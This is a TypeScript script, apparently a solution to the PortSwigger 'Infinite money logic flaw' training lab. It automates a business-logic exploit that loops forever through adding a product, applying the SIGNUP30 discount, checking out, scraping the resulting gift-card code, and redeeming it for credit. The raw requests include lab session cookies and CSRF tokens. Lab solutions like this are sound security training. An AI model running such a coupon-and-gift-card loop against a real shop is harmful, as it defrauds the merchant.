/**
 * PortSwigger Lab: Infinite money logic flaw
 * https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
 */

import { Sess } from "../base"

const LABID = "0ae200b304f1263c80b09ef900210079"

const iter = async () => {
	const sess = new Sess()

	await sess.req`
		POST /cart HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
		Content-Length: 36
		Cache-Control: max-age=0
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		Origin: https://${LABID}.web-security-academy.net
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.9
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/product?productId=2
		Accept-Encoding: gzip, deflate, br
		
		productId=2&redir=PRODUCT&quantity=1
	`

	await sess.req`
		POST /cart/coupon HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
		Content-Length: 53
		Cache-Control: max-age=0
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		Origin: https://${LABID}.web-security-academy.net
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.9
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/cart
		Accept-Encoding: gzip, deflate, br
		
		csrf=CPR3ohO6YSnk4dvzc7nzzGDZ5qXGi60Y&coupon=SIGNUP30
	`

	await sess.req`
		POST /cart/checkout HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
		Content-Length: 37
		Cache-Control: max-age=0
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		Origin: https://${LABID}.web-security-academy.net
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.9
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/cart
		Accept-Encoding: gzip, deflate, br

		csrf=CPR3ohO6YSnk4dvzc7nzzGDZ5qXGi60Y
	`

	const coupon = await sess.req`
		GET /cart/order-confirmation?order-confirmed=true HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.9
		Sec-Fetch-Site: none
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Accept-Encoding: gzip, deflate, br
		Referer: https://${LABID}.web-security-academy.net/cart
	`.then(r => r.bodreg(/<th>Code<\/th>\n\s+<\/tr>\n\s+<tr>\n\s+<td>(.*)<\/td>/)![0])

	await sess.req`
		POST /gift-card HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
		Content-Length: 58
		Pragma: no-cache
		Cache-Control: no-cache
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		Origin: https://${LABID}.web-security-academy.net
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.9
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/my-account?id=wiener
		Accept-Encoding: gzip, deflate, br

		csrf=CPR3ohO6YSnk4dvzc7nzzGDZ5qXGi60Y&gift-card=${coupon}
	`
}

let i = 0
while (true) {
	await iter()
	console.log("ITERATION:", ++i)
}
